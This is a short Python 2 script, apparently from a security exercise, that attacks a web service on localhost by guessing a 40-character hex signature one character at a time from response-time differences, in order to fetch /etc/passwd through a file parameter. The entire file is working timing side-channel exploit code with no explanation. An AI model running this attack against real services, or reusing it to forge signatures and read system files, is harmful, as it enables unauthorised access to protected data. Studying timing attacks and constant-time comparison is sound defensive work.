import requests
import string

def url_for(f, sig):
    return 'http://localhost:5000/?file=%s&signature=%s'%(f, sig)

def timedelta_ms(td):
    return td.microseconds + (td.seconds + td.days * 24 * 3600) * 10**6

if __name__ == '__main__':
    f = '/etc/passwd'

    hash_len = 40

    prefix = ''
    for i in range(hash_len):
        time = dict()
        for c in string.hexdigits:
            s = prefix + c
            s = s + (hash_len - len(s)) * 'z'

            url = url_for(f, s)
            r = requests.get(url)
            if r.text == 'true':
                time[c] = 10**10
                break
            time[c] = timedelta_ms(r.elapsed)
        match = max(time, key=time.get)
        prefix += match
        print prefix
